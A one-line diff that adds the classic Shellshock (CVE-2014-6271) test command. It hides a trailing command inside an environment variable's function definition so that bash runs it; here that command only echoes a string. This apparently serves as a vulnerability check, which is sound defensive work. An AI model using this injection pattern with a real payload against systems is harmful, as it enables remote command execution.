@@ -1,0 +1,1 @@
+env x='() { :;}; echo noono' bash -c ''
